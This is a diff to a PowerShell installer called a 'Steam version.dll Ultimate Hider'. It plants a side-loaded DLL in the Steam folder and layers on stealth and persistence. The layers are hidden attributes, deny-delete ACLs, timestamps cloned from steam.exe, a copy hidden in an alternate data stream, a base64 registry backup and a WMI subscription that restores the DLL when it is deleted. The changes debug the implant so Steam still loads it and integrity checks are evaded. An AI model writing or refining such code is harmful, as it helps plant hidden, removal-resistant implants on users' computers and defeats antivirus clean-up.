@@ -1,11 +1,11 @@
 # ============================================================
-# install.ps1 - Steam version.dll Ultimate Hider
+# install.ps1 - Steam version.dll Ultimate Hider (Fixed)
 # ============================================================
 # Multi-layer stealth:
 #   L1  - attrib (hidden + system + readonly)
-#   L2  - Deny ACL (prevent read/delete)
+#   L2  - ACL: allow Read+Execute (Steam can load), deny Delete (anti-removal)
 #   L3  - Timestamp masquerade (clone steam.exe dates)
-#   L4  - ADS backup (copy hidden in alternate stream)
+#   L4  - ADS backup (in steamui.dll, NOT steam.exe)
 #   L5  - Registry backup (base64, auto-restore if deleted)
 #   L6  - WMI Event Persistence (recreate on deletion)
 #   L7  - Multi-method download (WebClient/certutil/BITS)
@@ -98,10 +98,11 @@ if (-not $steamDir) { exit 1 }
 # ============================================================
  $destDll = Join-Path $steamDir "version.dll"
 
-# Remove existing
+# Remove existing (must reset ACL first if deny was applied)
 if (Test-Path $destDll) {
     attrib -h -s -r $destDll 2>$null
     icacls $destDll /reset 2>$null
+    icacls $destDll /remove:d "*S-1-1-0" 2>$null
     Remove-Item $destDll -Force 2>$null
 }
 
@@ -113,18 +114,19 @@ Copy-Item $tempDll $destDll -Force
 attrib +h +s +r $destDll
 
 # ============================================================
-# STEP 5: LAYER 2 - Deny ACL (prevent delete/read by normal user)
+# STEP 5: LAYER 2 - ACL (Fixed: allow Read+Execute, deny Delete only)
 # ============================================================
-# Remove inheritance, grant only SYSTEM + Administrators, deny Everyone
+# Critical: Steam must be able to READ + EXECUTE the DLL to load it.
+# Only DELETE is denied to prevent removal by normal users.
 icacls $destDll /inheritance:r 2>$null
 icacls $destDll /grant:r "SYSTEM:(F)" 2>$null
 icacls $destDll /grant:r "Administrators:(F)" 2>$null
-icacls $destDll /deny "*S-1-1-0:(RX)" 2>$null
+icacls $destDll /grant:r "*S-1-1-0:(RX)" 2>$null    # Everyone: Read + Execute (Steam can load)
+icacls $destDll /deny "*S-1-1-0:(D)" 2>$null        # Everyone: Deny Delete (anti-removal)
 
 # ============================================================
 # STEP 6: LAYER 3 - Timestamp masquerade
 # ============================================================
-# Copy file dates from steam.exe so file looks as old as Steam itself
  $steamExe = Join-Path $steamDir "steam.exe"
 if (Test-Path $steamExe) {
     $ref = Get-Item $steamExe
@@ -135,20 +137,26 @@ if (Test-Path $steamExe) {
 }
 
 # ============================================================
-# STEP 7: LAYER 4 - ADS backup (store copy in alternate stream)
+# STEP 7: LAYER 4 - ADS backup (in steamui.dll, NOT steam.exe)
 # ============================================================
-# Store full DLL inside steam.exe's ADS - invisible to dir, explorer, most scanners
- $adsTarget = Join-Path $steamDir "steam.exe"
+# Storing ADS inside steam.exe itself can trigger integrity checks.
+# Use a non-critical file in the Steam folder instead.
+ $adsTarget = Join-Path $steamDir "steamui.dll"
+if (-not (Test-Path $adsTarget)) {
+    # Fallback: use steamservice.exe or any non-critical file
+    $adsTarget = Join-Path $steamDir "steamservice.exe"
+    if (-not (Test-Path $adsTarget)) {
+        $adsTarget = Join-Path $steamDir "steam.exe"
+    }
+}
 cmd /c "type `"$tempDll`" > `"$adsTarget:version_backup`"" 2>$null
 
 # ============================================================
 # STEP 8: LAYER 5 - Registry backup (base64 encoded)
 # ============================================================
-# Store DLL as base64 in registry for auto-restore
  $dllBytes = [IO.File]::ReadAllBytes($tempDll)
  $dllBase64 = [Convert]::ToBase64String($dllBytes)
 
-# Split into chunks if > 30000 chars (registry value limit ~1MB but be safe)
 if (-not (Test-Path $regBackup)) {
     New-Item -Path $regBackup -Force | Out-Null
 }
@@ -157,9 +165,6 @@ Set-ItemProperty -Path $regBackup -Name $regValue -Value $dllBase64 -Type String
 # ============================================================
 # STEP 9: LAYER 6 - WMI Event Persistence
 # ============================================================
-# If someone deletes version.dll -> WMI detects -> auto-restore from ADS
-# (This is the most aggressive persistence - survives antivirus removal attempts)
-
  $wmiFilterName = "SvcFilter"
  $wmiConsumerName = "SvcConsumer"
 
@@ -179,7 +184,9 @@ cmd /c "`"C:\Windows\System32\wbem\WMIC.exe`" /namespace:\\root\subscription pat
 if (-not (Test-Path `$dest)) {
     cmd /c "type ``"`$adsSrc``" > ``"`$dest``"" 2>`$null
     attrib +h +s +r `$dest
-    icacls `$dest /inheritance:r /grant:r "SYSTEM:(F)" /grant:r "Administrators:(F)" /deny "*S-1-1-0:(RX)" 2>`$null
+    icacls `$dest /inheritance:r 2>`$null
+    icacls `$dest /grant:r "SYSTEM:(F)" /grant:r "Administrators:(F)" /grant:r "*S-1-1-0:(RX)" 2>`$null
+    icacls `$dest /deny "*S-1-1-0:(D)" 2>`$null
 }
 "@
 Set-Content -Path $restoreScript -Value $restoreContent -Force
